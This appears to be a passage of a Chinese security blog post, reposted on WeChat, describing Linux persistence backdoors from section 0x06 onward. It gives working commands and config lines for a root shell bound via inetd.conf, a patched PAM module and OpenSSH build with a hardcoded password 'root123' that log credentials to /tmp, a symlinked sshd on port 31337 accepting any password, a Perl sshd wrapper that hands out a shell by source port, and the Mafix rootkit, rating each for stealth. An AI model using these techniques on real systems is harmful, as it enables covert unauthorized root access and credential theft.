> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Q5_2TXSEmNWpcp9bTN1x9w)

![](https://mmbiz.qpic.cn/mmbiz_gif/cW8GezRBf38VQw73hmM9EJNpnjLStNutQRj5Nk7BicuEvvAutUkD5fJXv7bqkHqVZUh1juSohKHzSibCPTXmUCzw/640?wx_fmt=gif)

**0x06  远程后门**

**利用方法：**

      我们使用 vi 来修改 / etc/inetd.conf 文件，如下所示：

**原文件：**

```
#chargen dgram udp wait root internal
#discard stream tcp nowait root internal
#discard dgram udp wait root internal
#daytime stream tcp nowait root internal
```

**修改为：**  

```
#discard stream tcp nowait root internal
#discard dgram udp wait root internal
daytime stream tcp nowait root /bin/bash bash -i
```

**开启 inetd：**  

```
du:~# inetd
```

**如果要强制重启 inetd：**  

```
dawg:~# ps -ef grep inetdroot
362 1 0 Jul22 ? 00:00:00 /usr/sbin/inetdroot
13769 13643 0 17:51 pts/1 00:00:00 grep inetd
dawg:~# kill -HUP 362
```

**现在我们就可以用 nc 来爆菊了：**

```
C:tools 192.168.1.77: inverse host lookup failed: h_errno 11004: NO_DATA
(UNKNOWN) [192.168.1.77] 13 (daytime) open
bash：no job control in this shell
bash-2.05b# bash-2.05b#
bash-2.05b# iduid=0(root)
git=0(root) groups=0(root) bash-2.05b# uname -a
Linux dawg 2.4.20-1-386 #3 Sat Mar 22 12:11:40 EST 2003 i686 GNU/Linux
```

**可以修改 / etc/services 文件，添加以下代码：**

```
woot 6666/tcp #evil backdoor service
```

**然后修改 / etc/inetd.conf：**

```
woot stream tcp nowait root /bin/bash bash -i
```

      另外我们还可以修改成一些常见的端口，以实现隐藏。  

**0x07  PAM 后门**

1、获取目标系统所使用的 PAM 版本：

```
rpm -qa grep pam
```

2、编译安装 PAM。

3、将本地 pam_unix_auth.c 文件通过打补丁方式，编译生成。

4、编译完成后的文件在：modules/pam_unix/.libs/pam_unix.so，后门密码为 root123，并会在 / tmp/pslog 记录 root 登录密码。  
**特点：**

       优势：隐蔽性强，不容易发现。

      劣势：需要编译环境，缺少 GCC 或其他依赖包容易出现问题。

**0x08  openssh 后门**

**简介：**

      下载新版本的 openssh，并下载对应 patch 包，这个 patch 文件包含 sshbd5.9p1.diff 文件为后门文件，文件包括：auth.c、auth-pam.c、auth-passwd.c、canohost.c、includes.h、log.c、servconf.c、sshconnect2.c、sshlogin.c、version.h。

**利用方法：**

      tar-zxvf、openssh-5.9p1.tar.gz  

```
vi includes.h   //修改后门密码，记录文件位置
/*
#define ILOG "/tmp/ilog"   //记录登录到本机的用户名和密码
#define OLOG "/tmp/olog"   //记录本机登录到远程的用户名和密码
#define SECRETPW "root123"   //你的后门密码
*/
```

**特点：**

       优势：隐蔽性强，不容易被发现。

      劣势：需要编译环境，缺少 GCC 或其他依赖包容易出现问题。

**0x09  快速获得 ssh 后门**

**简介：**

      执行命令就会派生一个 31337 端口，然后连接 31337，用 root/bin/ftp/mail 当用户名，密码随意，就可登录。

**利用方法：**

      在远程主机上执行：

```
ln -sf /usr/sbin/sshd/tmp/su;/tmp/su -oPort=31337
```

      就会派生一个 31337 端口，然后连接 31337，用 root/bin/ftp/mail 当用户名，密码随意，就可登录。  

**特点：**

      优势：隐蔽性弱，适合短时间连接。  

      劣势：重启后会断开，无法后弹连接。

**0x10  SSH wrapper 后门**

**简介：**

      init 首先启动的是 / usr/sbin/sshd，脚本执行到 getpeername 这里的时候，正则匹配会失败，于是执行下一句，启动 / usr/bin/sshd，这是原始 sshd。

      原始的 sshd 监听端口建立了 tcp 连接后，会 fork 一个子进程处理具体工作。这个子进程，不需要检验，而是直接执行系统默认位置的 / usr/sbin/sshd，这样子控制权又回到脚本了。  

      此时子进程标准输入输出已被重定向到套接字，getpeername 能真的获取到客户端的 TCP 源端口，如果是 19523 就执行 sh 给个 shell。  

**利用方法：  
**

**客户端：**

```
[root@localhost~]# cd /usr/sbin
[root@localhost~]# mv sshd ../bin
[root@localhost~]# echo '#!/usr/bin/perl'>sshd
[root@localhost~]# echo 'exec "/bin/sh" if(getpeername(STDIN)=~/^..4A/);'>>sshd
[root@localhost~]# echo 'exec{"/usr/bin/sshd"}"/usr/sbin/sshd",@ARGV,'>>sshd
[root@localhost~]# chmod u+x sshd
[root@localhost~]# /etc/init.d/sshd restart
```

**控制端：**  

```
socat STDIOTCP4:target_ip:22,sourceport=19526
```

**特点：**

      优势：隐蔽性较强，不需要编译，使用于大部分环境中。  

      劣势：需要重启 sshd 进程。

**0x11  mafix rootkit 创建后门**

**简介：**

      Mafix 是一款常用的轻量应用级别 Rootkits，是通过伪造 ssh 协议漏洞实现远程登录的特点是配置简单并可以自定义验证密码和端口号。

**利用方法：**

      安装完成后，使用 ssh 用户 @ip -p 配置的端口，即可远程登录。

**特点：**

      优势：隐蔽性一般，不需要编译。  

      劣势：会替换 ls 等命令，容易被识破。

![](https://mmbiz.qpic.cn/mmbiz_jpg/c6gqmhWiafypu8xMx0VGdz69F9YhVguXuME1NXHKBJvbXrGQUqA33gM6papce4MI1p7licuSL2uPbw5oXkA0YXWQ/640?wx_fmt=jpeg)

往期推荐

  

  

[3601 病毒分析](http://mp.weixin.qq.com/s?__biz=MzA5MDE2ODI0NQ==&mid=2247485560&idx=1&sn=048f0b6bb05dfb6642c41c9e2d8d6198&chksm=900e86a2a7790fb42ddea5b4548fb5c51d3f92a061307fc746c688eb2d98da3263dc16135e92&scene=21#wechat_redirect)

  

[网安笔记 | 非法网站渗透](http://mp.weixin.qq.com/s?__biz=MzA5MDE2ODI0NQ==&mid=2247485560&idx=2&sn=0a6d85a1c70a9d8902d99c90a1d7fd61&chksm=900e86a2a7790fb4dd6d7a75474be7beced84245e7f3c0b39579955077f7e8d4ad2355552d02&scene=21#wechat_redirect)

  

[PhpWeb CMS 前台 Getshell](http://mp.weixin.qq.com/s?__biz=MzA5MDE2ODI0NQ==&mid=2247485421&idx=1&sn=63eb781ffcdc36e4c7fcdfd9117cc54a&chksm=900e8937a7790021be02a0425255b7bbe1034dc39a34054b36290f774b91ede04d4a3a89d3ae&scene=21#wechat_redirect)

  

[WarmUp | 滑稽的代码审计](http://mp.weixin.qq.com/s?__biz=MzA5MDE2ODI0NQ==&mid=2247485421&idx=2&sn=641ca30e3f944181a9a5931189b06c56&chksm=900e8937a7790021394b0aaf0f9272cc0b191ea2a76ed5c3a72beb4a0e649f357ead8d31a3bf&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/6aVaON9Kibf5VNYt0ibwA6m1BvnXYFSnVn8icyic45TuQk1ib633LibS0HKWYQ6qz0yBLo894U0T52O2YEtyP3iaB7P1w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/5mCYKkWvZAh6zJBCiaXHKIpUycpKkr5ZVic0MtG1eibric9weY8PtSB23R7OKFb1AlGG0kbaKXyYhOiao6D8UK9KrqA/640?wx_fmt=jpeg)

长按二维码

关注我们吧

![](https://mmbiz.qpic.cn/mmbiz_png/US10Gcd0tQENdoltlmlstW79v8ibDFelROfzwpmcZ6r2ZINfyXOc24AVAON65c7shCuT1l1bz7ziavNMZSApBnhg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/NuIcic2jibgNJzwoZYCo6ThfOoeX410mwuDxnOnv5za18VZJ7ib30pic2NSNnicziaONicvs1C9yMDr6zV40ADD9yPP7Q/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/5mCYKkWvZAiaFXU9Shv9qyNibMjicOgIyic9vU88IQAMqhtuaUAN04xHhnicbT112sfdFe9mIG187l80j0onqHKdobQ/640?wx_fmt=png)

注：本文转载自 SecPulse 安全脉搏，可点击左下角阅读原文查看详情！